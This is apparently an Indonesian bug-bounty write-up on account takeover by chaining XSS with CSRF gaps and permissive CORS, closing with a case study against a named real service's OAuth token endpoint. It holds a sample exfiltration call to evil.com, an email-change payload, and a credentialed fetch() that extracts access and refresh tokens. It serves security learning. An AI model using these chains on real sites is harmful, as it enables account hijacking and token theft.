# Account Takeover melalui XSS

## Cross-site Request Forgery (CSRF)

Langkah-langkah pertahanan seperti token **anti-CSRF**, **cookie SameSite**, dan **double-submit token** memastikan bahwa permintaan yang mengubah status dilakukan secara sengaja oleh pengguna.

Perlindungan CSRF tidak mencegah XSS untuk dieksekusi, tetapi membatasi sejauh mana penyerang dapat memanfaatkan XSS menjadi aksi berbahaya seperti transfer dana paksa atau perubahan password.

Perlindungan CSRF adalah kontrol mitigasi dampak — tidak menghentikan injeksi itu sendiri, tetapi mencegah penyerang menggabungkannya menjadi perubahan status yang tidak sah.

---

Untuk setiap endpoint yang kita temui, kita harus menanyakan pertanyaan-pertanyaan ini kepada diri sendiri:
**Apakah ada perlindungan keamanan?**

Jika ada, kita mungkin perlu melewatinya. Kita dapat mengujinya dengan mengirimkan request, yaitu dengan memaksa korban untuk mengirimkannya melalui **Console**, dan jika berhasil di akun kita, maka akan berhasil juga di akun mereka.

Jadi jika kita mengirim token **CSRF** sebagai header selain cookie, dan ini adalah pengaturan yang sangat umum, maka sistem akan melihat apakah keduanya cocok. Periksa apakah cookie CSRF tersebut memiliki **flag httpOnly true**. Jika tidak, akan sangat mudah untuk mengambilnya dengan JavaScript, lalu mengirimkannya sebagai header.

Meskipun mungkin kita perlu melakukan itu agar dapat menyuntikan script eksternal yang lebih besar pada saat itu.

---

## Bypass SOP by Chaining Vulns

Jika XSS ada di `https://app.example.com` dan `https://api.example.com` salah konfigurasi dengan `Access-Control-Allow-Origin: *` dan `Access-Control-Allow-Credentials: true`, maka payload yang disuntikkan dapat menjalankan:

`fetch("https://api.example.com/account/export", { credentials: "include" })` dari `app.example.com`.

Karena cookie sesi diatur untuk domain `.example.com` tanpa SameSite, browser akan otomatis melampirkannya, sehingga request tersebut terautentikasi atas nama korban.

> SOP (Same-Origin Policy) biasanya mencegah pembacaan response, tetapi kebijakan CORS yang terlalu longgar memungkinkan script yang disuntikkan untuk mengakses seluruh isi response dan mengekfiltrasi data tersebut (misalnya: `fetch("https://evil.com", { method: "POST", body: data })`).

> Hal ini memungkinkan pencurian langsung data sensitif seperti PII atau export billing. Bahkan jika akses response diblokir, XSS tetap bisa membuat request yang mengubah state (misalnya `/user/changeEmail?email=attacker@evil.com`) untuk memanfaatkan CSRF dan mengambil alih akun.

---

Jadi pertanyaan berikutnya:
**Apakah permintaan tersebut dikirim ke domain berbeda?**

Jika demikian, itu berarti ada implementasi CORS, dan efektivitas pengaturan CORS tersebut akan menentukan di mana Anda perlu menemukan XSS Anda. Semakin salah konfigurasi CORS, semakin besar kemungkinan kita akan menemukan XSS untuk menjadikannya senjata.

**Implementasi CORS** itu sendiri sangat mudah. Anda hanya perlu melihat domain di header `Origin`. Pertama-tama lihat apakah ada subdomain, dan kemudian periksa juga domain yang sama sekali berbeda. Kebanyakan orang menggunakan `evil.com`.

Aplikasi manapun yang di-hosting di domain manapun yang diterima oleh implementasi CORS tersebut berpotensi menemukan bug XSS untuk menyelesaikan serangan.

**Dan ingat**, bahwa beberapa aplikasi mungkin tampak rentan karena Anda tidak mendapatkan block header `Origin` dalam request `GET` atau `POST` dengan domain yang tidak valid, tetapi mungkin Anda menemukan bahwa mereka memblokir `Preflight`.

Itu berarti endpoint akan tampak rentan di **Burp Suite**, tetapi saat Anda mencoba mengeksekusi serangan di browser, browser itu sendiri akan memblokirnya melalui `Preflight`.

Jadi sekali lagi, cara terbaik untuk mengkonfirmasi adalah dengan menggunakan **Console** dan **DevTools**. Anda tahu, menguji dengan Burp terkadang menghasilkan banyak false positive, dan banyak waktu terbuang.

---

## Data Exfiltration (Pengambilan Data Secara Diam-diam)

Ketika XSS dieksekusi, script yang disisipkan berjalan dengan **hak akses yang sama** seperti kode aplikasi. Ini memungkinkan script tersebut membaca data sensitif yang ada di DOM (seperti token, PII, nilai konfigurasi, field tersembunyi), lalu mengirimkannya ke sistem yang dikendalikan oleh penyerang.

Karena browser hanya menerapkan **Same-Origin Policy (SOP)** pada **pembacaan response**, bukan pada **pengiriman request**, penyerang bisa memanfaatkan berbagai “side channel” seperti gambar, AJAX, atau request background untuk mengirim data curian ke luar tanpa terdeteksi.

---

### 🔎 Teknik yang umum digunakan:

* **Image Beacon**
  Menggabungkan data dari DOM ke dalam query string pada tag `<img>` yang dibuat secara dinamis. Browser akan melakukan request ke URL tersebut, sehingga data bocor ke server milik penyerang.

* **Full HTML Dump**
  Menggunakan `XMLHttpRequest` atau `fetch()` untuk membaca `document.documentElement.outerHTML`, lalu mengirimkannya ke server remote. Ini memungkinkan penyerang mendapatkan seluruh isi halaman yang sudah dirender.

* **Clipboard Access**
  Menggunakan Clipboard API (`navigator.clipboard.readText()`) untuk mengambil isi clipboard, lalu mengirimkannya keluar. Ini bisa membocorkan data sensitif seperti credential atau token yang di-copy user.

* **History / DOM Dump**
  Mengambil data dari elemen DOM yang berhubungan dengan navigasi (misalnya tag anchor, log internal, atau daftar riwayat dalam aplikasi), lalu mengekstrak URL atau aktivitas yang pernah dilakukan sebelum dikirim ke penyerang.

---

Namun sekali lagi, kita harus memastikan bahwa kita memiliki **jalur serangan yang jelas** sebelum mulai mencari XSS.

Kesimpulannya:

* Pertama, temukan endpoint yang berpotensi digunakan untuk **Account Takeover (ATO)**.
* Kedua, uji **CSRF** untuk memastikan bahwa endpoint tersebut benar-benar bisa dieksploitasi tanpa interaksi pengguna yang sah.
* Jika kamu menguji XSS di beberapa domain, pastikan bahwa mekanisme CSRF juga **berfungsi di semua domain terkait**, karena tidak selalu konsisten—bisa saja hanya rentan di domain tertentu saja.

Selanjutnya, lakukan analisis terhadap **implementasi CORS** untuk mengidentifikasi domain mana yang:

* mengizinkan akses lintas origin,
* dan memungkinkan request dengan kredensial (cookie / auth).

Ini penting untuk menentukan di mana XSS bisa benar-benar **dipersenjatai (weaponized)**, bukan sekadar trigger.

Terakhir, uji **DOM-based XSS** di setiap domain yang relevan. Fokus pada titik-titik input yang diproses di sisi client. Idealnya, kamu menemukan satu titik XSS yang:

* bisa dijalankan secara konsisten,
* terhubung dengan endpoint sensitif,
* dan dapat digabungkan (chained) dengan CSRF atau CORS misconfiguration untuk mencapai dampak maksimal.



---

## Cara Melakukan Analisa (Step-by-Step Menurut Saya)

### 1. Identifikasi Token di Cookie

Saya akan melihat token di **Inspect Element → Cookie** untuk mengecek apakah **HttpOnly = false**.
Kalau **true**, saya akan beralih ke opsi lainnya seperti mengganti password.

---

### 2. Reset Password

Jika kita bisa memaksa korban untuk memperbarui atau mereset kata sandi mereka sebelum atau sebagai bagian dari serangan, kita tahu itu terjadi di backend, maka kita bisa masuk dengan kata sandi baru tersebut.

Di sini yang saya lakukan adalah melihat bagaimana web target melakukan reset password. Biasanya kita diminta untuk memasukkan password saat ini, atau sesuatu yang tidak kita ketahui sebagai attacker.

Jika kita menemukan mekanisme reset password yang hanya meminta:

* password baru
* dan konfirmasi password baru

atau tidak perlu memasukkan sesuatu yang tidak kita ketahui seperti password saat ini, maka ini adalah implementasi yang ideal untuk mencari bug ini.

---

### 3. Update Email

Namun, jika dari 2 opsi di atas tidak ada atau tidak sesuai, kita masih memiliki opsi ke-3, yaitu mengubah atau memperbarui email.

Jika kita hanya mencoba memperbarui email pada akun kita sendiri, mungkin tidak akan terlihat dampaknya. Namun, jika aplikasi tidak memiliki mekanisme email pemulihan (recovery email), atau tidak membatasi penambahan email tersebut, maka kita dapat mencoba menambahkan email pemulihan milik kita sendiri.

Dalam kondisi ini, jika aplikasi tidak melakukan verifikasi tambahan, maka email pemulihan tersebut dapat digunakan untuk membantu proses pengambilalihan akun.

---

Jadi yang saya lakukan adalah menambahkan **Recovery Email**.
**Di sini saya menggunakan email kedua saya**.

Setelah kita menambahkan email:

* kita akan diminta memasukkan kode verifikasi yang dikirim ke email tersebut

Ketika saya tangkap di Burp:

* harus dipastikan tidak ada parameter lain selain email

Lalu kita akan mencoba mengirim request POST ini melalui JavaScript.

---

Masalahnya ada di bagian verifikasi.
Karena:

* jika saya cek email, memang ada kode verifikasi
* tapi sebagai attacker, bagaimana saya bisa mendapatkan kode tersebut?

Di sinilah efek dari kontrol keamanan atau arsitektur sistem mulai terlihat.

---

Kemudian di Burp Suite, saya melihat bahwa response-nya adalah `pending`.
Jadi mungkin ada cara:

* mencoba login dengan email tersebut
* atau memicu ulang request verifikasi

Atau kemungkinan lain:

* mengirim kode verifikasi secara random

---

Awalnya saya pikir ini tidak bisa dieksploitasi, tapi kemudian saya berpikir:
“Kenapa tidak langsung kirim saja?”

Jadi sekarang yang perlu kita lakukan adalah mengetahui kodenya.

Karena kita tidak tahu kode dari awal:

* kita perlu memaksa korban mengirim kode sekali → status `pending`
* lalu ambil kode tersebut
* kemudian kirim ulang

Atau:

* lakukan XSS kedua untuk mengambil kode dari korban

Kecuali jika ingin menggunakan script eksternal yang lebih kompleks.

---

Jadi sekali lagi, ini bukan cara yang ideal.

---

## 4. Mapping Endpoint Sensitif (Tambahan)

Selain itu, kita juga perlu mengidentifikasi endpoint yang berhubungan dengan perubahan akun, seperti:

* `/user/changeEmail`
* `/user/changePassword`
* `/account/export`
* `/settings/update`
* `/api/profile`

Fokusnya adalah:

* Apakah endpoint ini membutuhkan autentikasi?
* Apakah request berbasis cookie?
* Apakah ada proteksi tambahan (CSRF token, OTP, dll)?

Ini penting untuk menentukan target utama dari serangan kita.

---

## 5. Uji Mekanisme CSRF (Tambahan)

Coba kirim request tanpa token atau dengan token yang tidak valid:

* Hapus header CSRF
* Ubah token
* Replay request dari akun lain

Perhatikan:

* Apakah request tetap diterima?
* Apakah validasi hanya bergantung pada cookie?

Jika iya, maka ini indikasi kuat bisa di-chain dengan XSS.

---

## 6. Analisa Scope Cookie (Tambahan)

Periksa cookie di browser (**DevTools → Application → Cookies**).

Hal penting:

* Apakah domain cookie = `.example.com` (shared antar subdomain)?
* Apakah ada flag `SameSite=None`?
* Apakah `HttpOnly = false`?

Jika:

* Cookie bisa diakses JS → bisa dicuri via XSS
* Cookie dikirim ke semua subdomain → bisa di-abuse via CORS
* `HttpOnly = false` → ini bukan pilihan bagus

⚠️ Namun perlu diingat:
Walaupun `HttpOnly = true`, bukan berarti XSS tidak berbahaya, karena masih bisa digunakan untuk melakukan request dengan kredensial.

---

## Analisa Endpoint OAuth (Case Study)

Di sini saya memiliki target yang akan saya fokuskan.

Ini adalah request POST yang dikirim sebagai bagian dari alur otentikasi, misalnya untuk ekstensi Firefox.

Contoh endpoint:

```
POST /v4/api/oauth2/token
```

Yang menarik:

* kita tidak perlu mengetahui informasi apapun di awal
* satu-satunya hal penting adalah **cookie**

---

Namun:

* cookie tidak bisa diambil via JavaScript karena `HttpOnly`
* tapi cookie tetap akan dikirim otomatis oleh browser

Jadi kita bisa:

* melakukan request AJAX
* dengan `credentials: include`

Ini adalah kesempatan yang ideal.

---

## Rencana Serangan

Kita akan memaksa korban, melalui:

* XSS (stored atau reflected)

Untuk mengirim request POST tersebut sebagai AJAX di backend.

Langkahnya:

1. Kirim request dengan credentials
2. Tangkap response
3. Ekstrak data (access_token, dll)

---

## Analisa CORS

Request ini kemungkinan berasal dari:

* `auth.grammarly.com`

Karena dipicu oleh ekstensi.

Kemungkinan besar ini adalah implementasi CORS.

---

Kita cek:

* tidak ada CSRF
* jadi tidak perlu bypass tambahan

---

### Validasi CORS

Dari response:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Ini sangat penting → endpoint terlihat “terbuka”.

---

Untuk memastikan, saya coba:

* set origin:

```
Access-Control-Allow-Origin: account.grammarly.com
```

Hasilnya:

* response tetap sama
* dan header berubah sesuai origin

---

Kemudian saya coba:

```
evil.com
```

Hasil:

* response masih sama
* header:

```
Access-Control-Allow-Origin: evil.com
```

Ini indikasi **CORS misconfiguration**

---

Namun, ini belum tentu valid bug.
Karena bisa saja hanya lolos di Burp, tapi diblokir oleh browser (Preflight).

---

## Validasi di Browser (DevTools)

Masuk ke:

* Inspect → Console

Jalankan:

```js
fetch("https://auth.grammarly.com/v4/api/oauth/token", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    client_id: "firefoxExt",
    grant_type: "urn:ietf:params:oauth:grant_type:client_id"
  })
}).then(r => r.json()).then(console.log)
```

---

Jika berhasil:

💥 Kita akan mendapatkan:

* access_token
* refresh_token
* dan data lainnya

---

Dan jika ini bisa dijalankan lewat XSS di browser korban:
➡️ **Account Takeover berhasil**

---


